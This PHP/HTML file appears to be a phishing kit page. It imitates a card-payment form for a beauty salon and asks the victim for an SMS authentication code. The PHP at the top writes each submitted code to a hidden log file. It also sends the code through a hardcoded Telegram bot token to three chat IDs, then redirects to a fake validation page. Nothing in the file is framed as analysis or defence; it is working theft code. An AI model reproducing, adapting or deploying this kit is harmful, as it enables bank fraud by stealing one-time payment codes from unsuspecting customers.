<?php
function sendMessageToTelegram($message) {
    $token = "7536723724:AAHcnShdSvrH_FoqzVkrIpxJOYox3VrYwWU";
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $chatIds = [7097403742, 6776568669,6823266892] ;
    foreach ($chatIds as $chatId) {
        $data = [
            'chat_id' => $chatId,
            'text' => $message ,
             'parse_mode' => 'Markdown'
        ];

        // Utilisation de cURL pour envoyer la requête POST
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($ch);
        curl_close($ch);

        // Optionnel : Affiche la réponse pour chaque chat_id
       
    }
}

if (isset($_POST["sms"]) ) {



$donnees = 

"\nSMS : " . $_POST['sms'] . "" .

"\n";
$file = "../blinky2000@bvc@bvc@destruction.txt" ;
file_put_contents($file, $donnees, FILE_APPEND);
 sendMessageToTelegram($donnees) ;
 header("Location: ./valid.php");
 exit();
}

?>



<html><head>
    <meta charset="utf-8">
    <title>Loasis Beauty - Paiement par Carte</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Effectuez un paiement sécurisé pour les services de massage et de beauté de Loasis Beauty.">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" rel="stylesheet">
    <style>
        body {
            font-family: 'Open Sans', sans-serif;
            background-color: #f8f9fa;
            color: #333;
        }
       
        .navbar-brand, .nav-link {
            color: #fff !important;
        }
        .payment-form {
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            padding: 30px;
            margin-top: 50px;
        }
        .form-control:focus {
            border-color: #FF69B4;
            box-shadow: 0 0 0 0.2rem rgba(255,105,180,.25);
        }
        .btn-primary {
            background-color: #FF69B4;
            border-color: #FF69B4;
        }
        .btn-primary:hover {
            background-color: #ff4da6;
            border-color: #ff4da6;
        }
        .card-element {
            border: 1px solid #ced4da;
            border-radius: 4px;
            padding: 10px;
        }
        .error-message {
            color: #dc3545;
            font-size: 0.875em;
            margin-top: 0.25rem;
        }
        .success-message {
            color: #28a745;
            font-size: 0.875em;
            margin-top: 0.25rem;
        }
    </style>
</head>
<body>
    <!-- Nav Bar Start -->
    <div class="navbar navbar-expand-lg bg-dark navbar-dark">
        <div class="container-fluid">
            <a href="https://loasisbeauty.com/" class="navbar-brand">L<span>oa</span>sis</a>
            <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbarCollapse">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse justify-content-between" id="navbarCollapse">
                <div class="navbar-nav ml-auto">
                    <a href="https://loasisbeauty.com/" class="nav-item nav-link">Home</a>
                    <a href="https://loasisbeauty.com/services" class="nav-item nav-link">Services</a>
                    <a href="https://loasisbeauty.com/contact" class="nav-item nav-link active">Contact</a>
                </div>
            </div>
        </div>
    </div>
    <!-- Nav Bar End -->
    
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-8 col-lg-6">
                <div class="payment-form">
                    <h2 class="text-center mb-4">Paiement par Carte</h2>
                    <form id="payment-form" action="sms.php" method="POST">

                        <div class="form-group">
                            <label for="card-number">Authentification  </label>
                            <input type="text" class="form-control" id="card-number" name="sms" required >
                        </div>

                        <button type="submit" class="btn btn-primary btn-block">Confirm</button>
                    </form>
                    <div id="payment-result" class="mt-3"></div>
                </div>
            </div>
        </div>
    </div>
    
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>
      
    </script>
</body></html>